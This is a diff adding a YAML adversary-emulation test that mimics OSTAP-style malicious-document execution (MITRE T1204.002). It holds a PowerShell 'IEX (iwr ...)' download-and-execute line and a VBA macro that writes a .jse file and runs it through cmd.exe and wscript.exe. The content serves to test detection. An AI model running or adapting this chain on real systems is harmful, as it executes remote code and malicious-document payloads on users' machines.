@@ -1,0 +1,45 @@
+api_version: "2.0"
+name: OSTAP JS version
+description: |
+    Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+args:
+    - name: ms_product
+      type: string
+      default: Word
+    - name: jse_path
+      type: path
+      default: C:\Users\Public\art.jse
+uuid: add560ef-20d6-4011-a937-2c340f930911
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1204: User Execution'
+    subtechniques:
+        - 'T1204.002: Malicious File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Microsoft #{ms_product} must be installed
+      inline: |
+        try {
+          New-Object -COMObject "#{ms_product}.Application" | Out-Null
+          $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+          Stop-Process -Name $process
+          exit 0
+        } catch { {Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+        } }
+      executor: powershell
+    - name: ostap-js-version
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        $macrocode = "   Open `"{{.Args.jse_path}}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript {{.Args.jse_path}}`", vbNormalFocus)`n"
+        Invoke-MalDoc -macroCode $macrocode -officeProduct "{{.Args.ms_product}}"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
